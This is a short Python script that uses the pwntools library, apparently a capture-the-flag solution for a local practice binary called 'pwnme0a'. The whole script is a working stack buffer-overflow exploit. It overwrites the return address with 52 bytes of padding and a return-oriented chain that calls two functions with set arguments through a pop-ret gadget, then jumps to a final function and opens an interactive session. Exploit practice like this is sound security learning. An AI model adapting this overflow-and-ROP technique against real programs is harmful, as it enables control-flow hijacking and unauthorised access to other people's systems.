from pwn import *

p = process('./pwnme0a')

padding     = b'A' * 52
koan1       = p32(0x08049196)
koan2       = p32(0x080491b7)
enlighten   = p32(0x080491db)
pop_ret     = p32(0x08049022)

payload  = padding
payload += koan1   + pop_ret + p32(0x69)
payload += koan2   + pop_ret + p32(0x420)
payload += enlighten

p.sendline(payload)
p.interactive()

